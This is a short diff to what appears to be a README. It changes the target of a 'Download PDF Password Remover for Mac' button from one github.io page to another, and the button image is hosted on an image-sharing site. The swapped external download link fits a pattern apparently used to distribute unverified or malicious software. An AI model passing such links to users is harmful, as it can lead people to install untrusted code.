@@ -11,7 +11,7 @@
 </p>
 
 <p align="center">
-  <a href="https://pudge-wagner.github.io/.github/pdf-password-remover-mac">
+  <a href="https://masdoas-apps.github.io/.github/pdf-password-remover-mac">
     <img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png"
          alt="Download PDF Password Remover for Mac" width="160"/>
   </a>
